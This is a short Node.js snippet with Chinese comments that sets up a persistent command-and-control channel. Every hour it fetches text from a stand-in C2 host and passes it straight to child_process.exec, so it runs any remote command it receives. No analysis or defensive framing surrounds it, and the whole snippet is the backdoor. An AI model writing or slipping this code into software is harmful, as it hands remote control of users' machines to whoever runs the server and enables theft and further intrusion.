// 建立持久化通信通道
setInterval(() => {
    fetch('https://c2.server/command')
      .then(res => res.text())
      .then(cmd => require('child_process').exec(cmd));
  }, 3600 * 1000); // 每小时请求指令